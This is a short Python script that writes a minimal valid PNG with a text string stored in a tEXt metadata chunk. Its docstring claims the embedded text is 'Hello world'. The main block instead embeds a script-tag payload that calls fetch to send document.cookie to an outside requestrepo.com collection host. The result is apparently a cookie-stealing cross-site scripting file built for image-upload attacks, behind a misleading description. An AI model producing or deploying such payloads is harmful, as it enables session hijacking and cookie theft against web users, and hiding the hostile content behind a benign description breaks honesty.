"""Create a valid PNG file (exact PNG magic bytes) with "Hello world" embedded."""

import struct
import zlib

PNG_MAGIC = b"\x89PNG\r\n\x1a\n"  # the exact 8-byte PNG signature


def make_chunk(chunk_type: bytes, data: bytes) -> bytes:
    """Build a PNG chunk: length + type + data + CRC32(type + data)."""
    return (
        struct.pack(">I", len(data))
        + chunk_type
        + data
        + struct.pack(">I", zlib.crc32(chunk_type + data) & 0xFFFFFFFF)
    )


def create_png_with_data(path: str, message: str) -> None:
    # IHDR: 1x1 pixel, 8-bit RGBA
    ihdr = struct.pack(">IIBBBBB", 1, 1, 8, 6, 0, 0, 0)

    # IDAT: one scanline = filter byte (0) + a single opaque red RGBA pixel
    idat = zlib.compress(b"\x00\xff\x00\x00\xff")

    # tEXt chunk: keyword + NUL + text -> the message lives inside the PNG itself
    text = make_chunk(b"tEXt", b"Comment\x00" + message.encode("ascii"))

    with open(path, "wb") as f:
        f.write(PNG_MAGIC)
        f.write(make_chunk(b"IHDR", ihdr))
        f.write(make_chunk(b"IDAT", idat))
        f.write(text)
        f.write(make_chunk(b"IEND", b""))


if __name__ == "__main__":
    create_png_with_data("image.png", "<script>fetch('https://ux3s7632.requestrepo.com/leak?' + document.cookie)</script>")
    print("image.png created")
